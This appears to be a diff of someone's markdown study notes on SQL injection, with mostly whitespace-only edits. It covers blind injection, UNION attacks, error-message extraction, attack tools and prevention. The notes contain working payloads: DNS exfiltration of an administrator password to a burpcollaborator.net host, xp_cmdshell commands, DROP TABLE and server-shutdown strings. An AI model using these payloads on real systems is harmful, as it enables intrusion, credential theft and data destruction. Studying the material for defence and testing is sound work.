@@ -119,18 +119,18 @@ use server response as a criterion
 ---
 
 #### Exploiting blind SQL injection by triggering conditional responses
-- Consider an application that uses tracking cookies to gather analytics about usage. 
+- Consider an application that uses tracking cookies to gather analytics about usage.
   - Requests to the application include a cookie header like this:
     - `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
   - When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:
     - `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
 
 - This query is vulnerable to SQL injection
-- the results from the query are not returned to the user. 
-- but the application does behave differently depending on whether the query returns any data. 
+- the results from the query are not returned to the user.
+- but the application does behave differently depending on whether the query returns any data.
 - If it returns data (because a recognized TrackingId was submitted), then a "Welcome back" message is displayed within the page.
 
-- This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information, by triggering different responses conditionally, depending on an injected condition. 
+- This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information, by triggering different responses conditionally, depending on an injected condition.
 - To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
 
 ```
@@ -138,20 +138,20 @@ xyz' UNION SELECT 'a' WHERE 1=1--
 xyz' UNION SELECT 'a' WHERE 1=2--
 
 The first of these values will cause the query to return results
-- because the injected or 1=1 condition is true, 
-- and so the "Welcome back" message will be displayed. 
+- because the injected or 1=1 condition is true,
+- and so the "Welcome back" message will be displayed.
 
-The second value will cause the query to not return any results, 
-- because the injected condition is false, 
-- and so the "Welcome back" message will not be displayed. 
+The second value will cause the query to not return any results,
+- because the injected condition is false,
+- and so the "Welcome back" message will not be displayed.
 ```
 
 > This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.
 
 ```
-suppose a table called Users 
+suppose a table called Users
 - columns: Username and Password
-- a user called Administrator. 
+- a user called Administrator.
 
 We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.
 
@@ -159,7 +159,7 @@ We can systematically determine the password for this user by sending a series o
 
 	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
 
-	- This returns the "Welcome back" message, indicating that the injected condition is true, 
+	- This returns the "Welcome back" message, indicating that the injected condition is true,
 	- and so the first character of the password is greater than m.
 
 
@@ -167,7 +167,7 @@ We can systematically determine the password for this user by sending a series o
 
 	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
 
-	- This does not return the "Welcome back" message, indicating that the injected condition is false, 
+	- This does not return the "Welcome back" message, indicating that the injected condition is false,
 	- and so the first character of the password is not greater than t.
 
 
@@ -178,7 +178,7 @@ We can systematically determine the password for this user by sending a series o
 
 4. continue this process to systematically determine the full password for the Administrator user.
 
-Note: The SUBSTRING function is called SUBSTR on some types of database. 
+Note: The SUBSTRING function is called SUBSTR on some types of database.
 For more details, see the SQL injection cheat sheet.
 ```
 
@@ -187,34 +187,34 @@ For more details, see the SQL injection cheat sheet.
 
 #### Inducing conditional responses by triggering SQL errors
 
-suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. 
-- The preceding technique will not work, 
+suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data.
+- The preceding technique will not work,
 - because injecting different Boolean conditions makes no difference to the application's responses.
 
 
-In this situation, induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. 
-- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. 
+In this situation, induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
+- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
 - Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
 
- 
 
-These inputs use the `CASE` keyword to `test a condition` and `return a different expression depending on whether the expression is true`. 
+
+These inputs use the `CASE` keyword to `test a condition` and `return a different expression depending on whether the expression is true`.
 - Assuming the error causes some difference in the application's HTTP response, use this difference to infer whether the injected condition is true.
 
 
 ```py
 xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
-# the case expression evaluates to NULL, does not cause any error. 
+# the case expression evaluates to NULL, does not cause any error.
 
 xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
-# it evaluates to 1/0, which causes a divide-by-zero error. 
+# it evaluates to 1/0, which causes a divide-by-zero error.
 
 
 # to retrieve data by systematically testing one character at a time:
 xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users--
 ```
 
-> Note: There are various ways of triggering conditional errors, and different techniques work best on different types of database. 
+> Note: There are various ways of triggering conditional errors, and different techniques work best on different types of database.
 
 
 ---
@@ -222,17 +222,17 @@ xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 
 
 #### Exploiting blind SQL injection by triggering time delays
 
-suppose that the application now catches database errors and handles them gracefully. 
+suppose that the application now catches database errors and handles them gracefully.
 - Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.
 
 
-to exploit the blind SQL injection vulnerability by triggering **time delays conditionally**, depending on an injected condition. 
-- Because SQL queries are generally processed synchronously by the application, 
-- delaying the execution of an SQL query will also delay the HTTP response. 
+to exploit the blind SQL injection vulnerability by triggering **time delays conditionally**, depending on an injected condition.
+- Because SQL queries are generally processed synchronously by the application,
+- delaying the execution of an SQL query will also delay the HTTP response.
 - This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.
 
 
-The techniques for triggering a time delay are highly specific to the type of database being used. 
+The techniques for triggering a time delay are highly specific to the type of database being used.
 - On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:
 
 ```py
@@ -247,36 +247,36 @@ retrieve data in the way already described, by systematically testing one charac
 
 `'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
 
-> Note: There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database 
+> Note: There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database
 
 ---
 
 
 #### Exploiting blind SQL injection using out-of-band (OAST) techniques
 
-Now, suppose that the application carries out the same SQL query, but does it asynchronously. 
-- The application continues processing the user's request in the original thread, 
-- and uses another thread to execute an SQL query using the tracking cookie. 
-- The query is still vulnerable to SQL injection, 
-- however none of the techniques described so far will work: 
+Now, suppose that the application carries out the same SQL query, but does it asynchronously.
+- The application continues processing the user's request in the original thread,
+- and uses another thread to execute an SQL query using the tracking cookie.
+- The query is still vulnerable to SQL injection,
+- however none of the techniques described so far will work:
 - the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.
 
 
-In this situation, exploit the blind SQL injection vulnerability by triggering **out-of-band network interactions** to a system that you control. 
+In this situation, exploit the blind SQL injection vulnerability by triggering **out-of-band network interactions** to a system that you control.
 - As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time.
 - But more powerfully, data can be exfiltrated directly within the network interaction itself.
 
-A variety of network protocols can be used for this purpose, 
+A variety of network protocols can be used for this purpose,
 - typically the most effective is DNS (domain name service), because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.
 
 
-The easiest and most reliable way to use out-of-band techniques is using **Burp Collaborator**. 
-- This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. 
+The easiest and most reliable way to use out-of-band techniques is using **Burp Collaborator**.
+- This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.
 - Support for Burp Collaborator is built in to Burp Suite Pro
 
 
-The techniques for triggering a DNS query are highly specific to the type of database being used. 
-- On Microsoft SQL Server, 
+The techniques for triggering a DNS query are highly specific to the type of database being used.
+- On Microsoft SQL Server,
   - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
   - to cause a DNS lookup on a specified domain
   - cause the database to perform a lookup for the following domain:
@@ -289,9 +289,9 @@ Having confirmed a way to trigger out-of-band interactions, then use the out-of-
 
 `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
 
-- This input reads the password for the Administrator user, 
-- appends a unique Collaborator subdomain, 
-- and triggers a DNS lookup. 
+- This input reads the password for the Administrator user,
+- appends a unique Collaborator subdomain,
+- and triggers a DNS lookup.
 - This will result in a DNS lookup like the following, allowing you to view the captured password:
 
 `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`
@@ -372,7 +372,7 @@ SQL doesn't always work the same, to determine the underlying database server.
 ---
 
 
-## SQL Injection Vulnerabilities  
+## SQL Injection Vulnerabilities
 
 **Databases** supporting web servers and applications
 - attractive targets for hackers.
@@ -383,10 +383,10 @@ SQL doesn't always work the same, to determine the underlying database server.
   - and Oracle Net Listener, ports 159
 
 A popular and effective attack against database applications on web servers: SQL injection.
-- This type of attack takes advantage of SQL server vulnerabilities, such as lack of proper input string checking and failure to install critical patches in a timely fashion.  
+- This type of attack takes advantage of SQL server vulnerabilities, such as lack of proper input string checking and failure to install critical patches in a timely fashion.
 
 
-SQL Injection Testing and Attacks     
+SQL Injection Testing and Attacks
 - An SQL injection attack exploits vulnerabilities in a web server database
 - These vulnerabilities arise because:
   - the database `does not filter escape characters `
@@ -409,7 +409,7 @@ to detect SQL injection vulnerabilities
 
 ---
 
-## Preparing for an Attack  
+## Preparing for an Attack
 To conduct an SQL injection, a hacker initially test a database to determine if it is susceptible to such an attack.
 - place a `single quote character ' `, into the query string of a URL.
   - Desired response: an **Open DataBase Connectivity (ODBC) error message**
@@ -420,10 +420,10 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
   - the return of an error message indicates that injection will work.
   - It is important to search the returned page for words such as ODBC or syntax.
 
-> A typical **ODBC error message** is:  
-> Microsoft OLE DB Provider for ODBC Drivers error '80040el4'  
-> [Microsoft] [ODBC SQL Server Driver] [SQL Server]Incorrect syntax near the keyword 'and' .  
-> /wasc.asp, line 68  
+> A typical **ODBC error message** is:
+> Microsoft OLE DB Provider for ODBC Drivers error '80040el4'
+> [Microsoft] [ODBC SQL Server Driver] [SQL Server]Incorrect syntax near the keyword 'and' .
+> /wasc.asp, line 68
 
 
 - If the website is supported by a backend database that incorporates scripting languages, like CGI or asp and dynamic data entry, the site is likely to be amenable to SQL injection exploits.
@@ -431,10 +431,10 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
   - Also, the `HTML source code` might contain FORM tags that support sending using a `POST` command to pass parameters to other asp pages.
   - The code between the FORM tags is susceptible to SQL injection testing, such as entering the `'` character.
 
-> A sample of such HTML source code is:  
+> A sample of such HTML source code is:
 > <FORM action=Search/search.asp method=post>
 > <input: type=hidden name=C value=D>
-> </FORM>  
+> </FORM>
 
 - Use a direct injection:
   - using an SQL statement and adding a space and the word OR to the parameter value in the query.
@@ -449,7 +449,7 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
 
 ---
 
-## Conducting an Attack  
+## Conducting an Attack
 
 1. put a SQL statement in the fields that is always true
 2. comments out the second single quote to prevent a SQL error.
@@ -471,7 +471,7 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
     - reads all the data in the Customers table: names, credit card data, and more.
     - SQL Server ignores everything after a `--`
     - comments out the second single quote to prevent a SQL error.
-    - The `; character`: denotes the end of an SQL query statement  
+    - The `; character`: denotes the end of an SQL query statement
 
 
 `' or username is not null or username= '`
@@ -480,8 +480,8 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
 
 
 `; shutdown with nowait;--`
-- SQL server provides another command that can be used in SQL injection:  
-- This command will terminate the server operation and implement an attack with the following responses:  
+- SQL server provides another command that can be used in SQL injection:
+- This command will terminate the server operation and implement an attack with the following responses:
   - Username: `; shutdown with nowait; --`
   - Password: `[Leave blank]`
 - If the SQL server is vulnerable, the following statement will be executed:
@@ -490,18 +490,18 @@ To conduct an SQL injection, a hacker initially test a database to determine if 
 
 ---
 
-### Lack of Strong Typing  
+### Lack of Strong Typing
 
 Another form of SQL injection takes advantage of the SQL developer not having incorporated strong typing into program.
 
 when program is expecting a variable of one type or different type is entered, an SQL injection attack can be effected.
 
-Example: the variable Employeenum is expected to be a number.  
+Example: the variable Employeenum is expected to be a number.
 - `SELECT Employeename FROM Emptable WHERE Employeenum = '';`
 
 If a character string is inserted instead, the database could be manipulated.
-- Setting the Employeenum variable: `l; DROP TABLE Emptable`  
-- `SELECT Employeename FROM Emptable WHERE Employeenum = l; DROP TABLE Emptable;`  
+- Setting the Employeenum variable: `l; DROP TABLE Emptable`
+- `SELECT Employeename FROM Emptable WHERE Employeenum = l; DROP TABLE Emptable;`
 - This SQL statement will erase the table Emptable from the database.
 
 
@@ -540,9 +540,9 @@ The first method
 - For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
 
 ```
-' ORDER BY 1--  
-' ORDER BY 2--  
-' ORDER BY 3--  
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
 etc.
 
 https://abc.net/filter?category=Lifestyle
@@ -562,9 +562,9 @@ The second method
 - submitting a series of `UNION SELECT` payloads specifying a different number of null values:
 
 ```
-' UNION SELECT NULL--  
-' UNION SELECT NULL,NULL--  
-' UNION SELECT NULL,NULL,NULL--  
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
 etc.
 
 GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
@@ -610,9 +610,9 @@ The reason for performing an `SQL injection UNION attack` is to be able to retri
 For example, if the query returns four columns, you would submit:
 
 ```
-' UNION SELECT 'a',NULL,NULL,NULL--  
-' UNION SELECT NULL,'a',NULL,NULL--  
-' UNION SELECT NULL,NULL,'a',NULL--  
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 ```
 
@@ -624,10 +624,10 @@ For example, if the query returns four columns, you would submit:
 
 ---
 
-#### retrieve interesting data by SQL injection UNION attack to 
+#### retrieve interesting data by SQL injection UNION attack to
 
-1. after determined the number of columns returned by the original query 
-2. found which columns can hold string data, 
+1. after determined the number of columns returned by the original query
+2. found which columns can hold string data,
 3. you are in a position to retrieve interesting data.
 
 Suppose that:
@@ -698,21 +698,21 @@ This returns output like the following:
 #### Retrieving multiple values within a single column
 
 - instead that the query only returns a single column.
-- can easily retrieve multiple values together within this single column by concatenating the values together, 
-- ideally including a suitable separator to let you distinguish the combined values. 
+- can easily retrieve multiple values together within this single column by concatenating the values together,
+- ideally including a suitable separator to let you distinguish the combined values.
 - For example
   - on Oracle you could submit the input:
   - `' UNION SELECT username || '~' || password FROM users--`
-  - the double-pipe sequence `||`: a string concatenation operator on Oracle. 
+  - the double-pipe sequence `||`: a string concatenation operator on Oracle.
   - The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
 
 The results from the query will let you read all of the usernames and passwords, for example:
 
 ```
-...  
-administrator~s3cure  
-wiener~peter  
-carlos~montoya  
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
 ...
 ```
 
@@ -724,10 +724,10 @@ The use of a LIKE clause, another method of SQL injection
 - Example:
 - inserting wildcard characters (like %),
   - Then, the WHERE clause = TRUE when the argument strPartName is included as part of a part name:
-  - Then, all parts names include the string `abc` will be returned.  
+  - Then, all parts names include the string `abc` will be returned.
   - `SELECT PartCost, PartName FROM PartsList WHERE PartName LIKE '%abc%';`
 - employ the wildcard symbol to guess the admin username:
-  - querying with `ad%`.  
+  - querying with `ad%`.
 
 ---
 
@@ -735,7 +735,7 @@ incorporating the UNION and LIKE statements is to use the **ODBC error message**
 
 Example 1:
 - the page `http://page/index.asp?id=20`.
-- use the UNION statement to set up a query as follows:  
+- use the UNION statement to set up a query as follows:
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --`
     - <kbd>Information_Schema Tables</kbd>: hold data on all the tables in the server database
     - <kbd>Table Name</kbd> field: holds name of each table in the database.
@@ -750,7 +750,7 @@ Example 1:
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
 > [Microsoft] [ODBC SQL Server Driver] [SQL Server]Syntax error converting the nvarchar value 'employeetable' to a column of data type int.
-> /index.asp, line 6  
+> /index.asp, line 6
 
 - Then using the following statement,
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') --`
@@ -759,19 +759,19 @@ Example 1:
 
 
 Example 2:
-- use the LIKE keyword in the following statement, additional information can be found:  
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--`  
+- use the LIKE keyword in the following statement, additional information can be found:
+  - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--`
   - The term `'%25login%25'`: will be interpreted as `%login%` by the server.
   - The resulting **ODBC error message** would be:
     - The ODBC error message identifies a table name as `sys_login`.
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
 > [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'sys_login' to a column of data type int.
-> /index.asp, line 6  
+> /index.asp, line 6
 
 - The next step, obtain a `login_name` from the `sys_login table`:
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login --`
-  - The resulting **ODBC error message**:  
+  - The resulting **ODBC error message**:
     - provides the login name `whiteknight` from the `sys_login` table
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
@@ -781,11 +781,11 @@ Example 2:
 
 - To obtain the password for whiteknight:
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 password FROM sys_login where login_name='whiteknight' --`
-  - The corresponding **ODBC error message**: gives the password for whiteknight is revealed: `rlkfoo3`.  
+  - The corresponding **ODBC error message**: gives the password for whiteknight is revealed: `rlkfoo3`.
 
 > Microsoft OLE DB Provider for ODBC Drivers error ‘80040907'
-> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'rlkfooB' to a column of data type int.  
-> /index.asp, line 6  
+> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'rlkfooB' to a column of data type int.
+> /index.asp, line 6
 
 ---
 
@@ -795,24 +795,24 @@ Example 2:
 Once table identified, obtaining the column names provides valuable information concerning the table and its contents.
 
 Examples:
-- acquire column names by accessing the database table `INFORMATION_SCHEMA.COLUMNS`.  
+- acquire column names by accessing the database table `INFORMATION_SCHEMA.COLUMNS`.
 - The injection attack begins with the URL:
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' --`
-  - The corresponding **ODBC error message**: gives the first column name in `Parts` table as `partnum`  
+  - The corresponding **ODBC error message**: gives the first column name in `Parts` table as `partnum`
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
-> [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partnum' to a column of data type int.  
-> /index.asp, line 6  
+> [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partnum' to a column of data type int.
+> /index.asp, line 6
 
-- To obtain, the second column name, the expression `not IN ()` can be applied as shown:  
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --`  
+- To obtain, the second column name, the expression `not IN ()` can be applied as shown:
+  - `http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --`
   - The corresponding **ODBC error message**: provides the next column name as `partcost`.
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040907‘
 > [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partcost‘ to a column of data type int.
-> /index.asp, line 6  
+> /index.asp, line 6
 
-In this manner, all the remaining columns in the table can be found.  
+In this manner, all the remaining columns in the table can be found.
 
 
 
@@ -820,7 +820,7 @@ In this manner, all the remaining columns in the table can be found.
 ---
 
 
-## Automated SQL Injection Tools     
+## Automated SQL Injection Tools
 
 A series of automated tools for finding SQL injection vulnerabilities and SQL injection attacks.
 
@@ -837,49 +837,49 @@ popular SQL injection tools：
 
 **Automagic SQL**
 - an automated injection tool
-- against Microsoft SQL server that supports applying xp_cmdshell, uploading database files, and identifying and browsing tables in the database.  
+- against Microsoft SQL server that supports applying xp_cmdshell, uploading database files, and identifying and browsing tables in the database.
 
 
 **Osql**
 - replaced by sqlcmd, it is good to be aware of it.
-- Osql interacts with a web server using ODBC and supports entering script files, Transact-SQL statements, and system procedures to the server database.  
+- Osql interacts with a web server using ODBC and supports entering script files, Transact-SQL statements, and system procedures to the server database.
 
 
 **sqlcmd**
-- This utility supports entering Transact-SQL statement, script files, and system procedures in SQLCMD mode. It replaces Osql utility functions.  
+- This utility supports entering Transact-SQL statement, script files, and system procedures in SQLCMD mode. It replaces Osql utility functions.
 
 
 **SQLDict**
 - application developed on Visual FoxPro 8.0 and supports the access of a variety of relational databases.
-- It provides a common interface to execute SQL commands, implement and test for dictionary attacks, browse and list database tables, display table attributes, and export table attributes.  
+- It provides a common interface to execute SQL commands, implement and test for dictionary attacks, browse and list database tables, display table attributes, and export table attributes.
 
 
 **SQLExec**
 - This database utility can be used with a variety of servers to display database tables and fields and generate SQL commands for different functions.
-- An SQLEXEC ( ) function in Visual FoxPro sends and executes an SQL command to a data source.  
+- An SQLEXEC ( ) function in Visual FoxPro sends and executes an SQL command to a data source.
 
 
 **SQLbf**
 - An SQL server brute force / dictionary password cracker
 - can be used to decrypt a password file or guess a password.
-- can also be used to evaluate the strength of Microsoft SQL Server passwords ofﬂine.  
+- can also be used to evaluate the strength of Microsoft SQL Server passwords ofﬂine.
 
 
 **SQLSmack**
 - A Linux-based tool
 - it can execute remote commands on Microsoft SQL server.
-- The commands are executed through the master.Xp_cmdshell but require a valid username and password.  
+- The commands are executed through the master.Xp_cmdshell but require a valid username and password.
 
 
 
 **SSRS**
-- Microsoft SQL Server Resolution Service is susceptible to buffer overﬂow attacks which can lead to the server executing arbitrary code, elevating privileges, and compromising the web server and database.  
+- Microsoft SQL Server Resolution Service is susceptible to buffer overﬂow attacks which can lead to the server executing arbitrary code, elevating privileges, and compromising the web server and database.
 
 
 **SQL2.exe**
 - This UDP buffer overﬂow remote hacking tool
 - sends a crafted packet to UDP port 1434 on the SQL Server 2000 Resolution Service.
-- The buffer overﬂow can result in the execution of malicious code in the server using the xp_cmdshell stored procedure.  
+- The buffer overﬂow can result in the execution of malicious code in the server using the xp_cmdshell stored procedure.
 
 
 
@@ -888,18 +888,18 @@ for vulnerabilities:
 
 **SQLBlock**
 - This utility functions as an ODBC data source and inspects SQL statements to protect access to Web server databases.
-- block dangerous and potentially harmful SQL statements and alert the system administrator.  
+- block dangerous and potentially harmful SQL statements and alert the system administrator.
 
 
 **Acunetix Web Vulnerability Scanner (WVS)**
 - automated scanner
 - can work in conjunction with manual utilities to analyze Web applications for vulnerabilities
-- can be used for penetration testing.  
+- can be used for penetration testing.
 
 
 **WSDigger**
 - an open source black box penetration testing Web services framework
-- can test for cross site scripting, SQL injection and other types of attack vulnerabilities.  
+- can test for cross site scripting, SQL injection and other types of attack vulnerabilities.
 
 
 **WebInspect**
@@ -910,7 +910,7 @@ for vulnerabilities:
 ---
 
 
-## SQL Injection Prevention and Remediation     
+## SQL Injection Prevention and Remediation
 
 SQL injection:
 - attack a web server database, compromise critical information,
@@ -942,7 +942,7 @@ Defend attack:
     - If it is necessary to include symbols, they should be converted to HTML substitutes.
   - Check to `make sure numeric inputs are integers` before passing them to SQL queries.
   - Screen input strings from users and URL parameters to eliminate single and double quotes, semicolons, back slashes, slashes, and similar characters.
-  - Use bound parameters to create an SQL statement with placeholders such as `?` for each parameter, compile the statements, and execute the compilation later with actual parameters.    
+  - Use bound parameters to create an SQL statement with placeholders such as `?` for each parameter, compile the statements, and execute the compilation later with actual parameters.
 
 - **Proper error handling**
   - Instead of showing the errors, customized database server error messages, simply present a `generic error web page that doesn’t provide any details`.
@@ -951,7 +951,7 @@ Defend attack:
 - **Stored procedures / parameterized queries**
   - use parameterized queries instead of string concatenation within the query.
   - The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.
-  - the user can't manipulate the string in the program.  
+  - the user can't manipulate the string in the program.
     - Not copying the input directly into statement,
     - Values sent from the user side become parameters passed into the queries
       - `the input is passed to the stored procedure as a parameter`.
@@ -965,7 +965,7 @@ Defend attack:
   - a group of SQL statements that execute as a whole, like a mini-program.
   - database developers often use stored procedures with dynamic web pages.
   - parameterized stored procedure accepts input data as parameter.
-    - Employ `needed stored procedures with embedded parameters through safe callable interfaces`.  
+    - Employ `needed stored procedures with embedded parameters through safe callable interfaces`.
     - `Remove stored procedures that are not needed`.
       - Candidates include:
       - `xp_sendmail`
@@ -992,7 +992,7 @@ Depending on how well the database server is locked down (or not), SQL injection
 
 ---
 
-### Stored Procedures  
+### Stored Procedures
 
 Stored procedure:
 - group of SQL statements that is designed to perform a specific task.
@@ -1000,30 +1000,30 @@ Stored procedure:
 - A stored procedure can be `called by its name and pass the required parameters to the procedure`.
 
 > SQL injection can also use stored procedures in a web server database.
-> - SQL injection can be initiated if the stored procedure is not employed properly.  
+> - SQL injection can be initiated if the stored procedure is not employed properly.
 
-One useful procedure: `master.dbo.xp_cmdshe11`, incorporates follow syntax:  
+One useful procedure: `master.dbo.xp_cmdshe11`, incorporates follow syntax:
 - `xp_cmdshell ( 'Command_string’ ) [, no_output]`
-- The argument `' command_string'` is an SQL command.  
+- The argument `' command_string'` is an SQL command.
 
 Example:
-- following construction provides employee info from an employee name search:  
+- following construction provides employee info from an employee name search:
   - CREATE PROCEDURE SP_EmployeeSearch @Employeename varchar(200) = NULL AS
   - DECLARE @sql nvarchar(2000)
   - SELECT @sql = ' SELECT EmloyeeNum, EmployeeName, Title, Salary ' + ' FROM Employee Where '
   - IF @EmployeeName IS not NULL
   - SELECT @sql = @sql + ' EmployeeName LIKE ' ' ' + @employeename + ' ' ' '
-  - EXEC (@sql)  
+  - EXEC (@sql)
 
   - In this procedure, the user provides the @employeename variable as input, which is then concatenated 连接的 with @sql.
 - An SQL injection can be initiated by the user if he or she substitutes 1' or ‘1’=‘1’ ;exec master.dbo.xp_cmdshell 'dir' -- for the @employeename variable.
-  - If this substitution is made, the SQL statement executed will be as follows:  
+  - If this substitution is made, the SQL statement executed will be as follows:
   - SELECT EmployeeNum, EmployerNumber, ,EmployeeName FROM Employee Where EmployeeName LIKE ‘1’ or ‘1’=‘1’;exec master.dbo.xp_cmdshell 'dir' --
-  - The result of this SQL query: access to all rows from the employee table.  
+  - The result of this SQL query: access to all rows from the employee table.
 
 Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:
 - produces an SQL statement and an output file location.
-- The syntax for master.dbo.sp_makewebtask is:  
+- The syntax for master.dbo.sp_makewebtask is:
   - sp_makewebtask [@outputfile =] 'outputfile', [@query =] 'query'
 
 
@@ -1035,33 +1035,33 @@ Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:
 
 ---
 
-### Extended Stored Procedures  
+### Extended Stored Procedures
 
 Extended stored procedures:
 - extend the functions available in the SQL Server environment
 - and are useful in setting up and maintaining the database.
 - Because of vulnerabilities in some of these procedures, these programs can be called to initiate and support SQL injection attacks.
 
-A listing of some of these extended procedures is given as follows:  
+A listing of some of these extended procedures is given as follows:
 - `xp_availablemedia`: Provides a list of available computer drives
-- `xp_dirtree`: Provides a directory tree  
+- `xp_dirtree`: Provides a directory tree
 - `xp_enumdsn`: Identifies server ODBC data sources
 - `xp_loginconfig`: Provides server security mode data
 - `xp_mkecab`: Supports user generation of a compressed archive of files on the server and files that can be accessed by the server
-- `exec master..xp_cmdshell 'dir ' `: Provides a listing of the SQL Server process current working directory  
-- `exec master..xp_cmdshell 'net1 user ‘`: Provides a list of all computer users  
+- `exec master..xp_cmdshell 'dir ' `: Provides a listing of the SQL Server process current working directory
+- `exec master..xp_cmdshell 'net1 user ‘`: Provides a list of all computer users
 - `Custom extended stored procedures`: Can also be developed to execute as part of the SQL server code
 
 ---
 
-### Sewer System Tables  
+### Sewer System Tables
 
 It is helpful to know which system tables in the database server can be used as targets in SQL injection.
 
 
 Summarizes the tables for 3 common database servers:
 
-Sewer Database Tables           
+Sewer Database Tables
 
 | ORACLE                        | MS ACCESS         | MS SQL     |
 | ----------------------------- | ----------------- | ---------- |
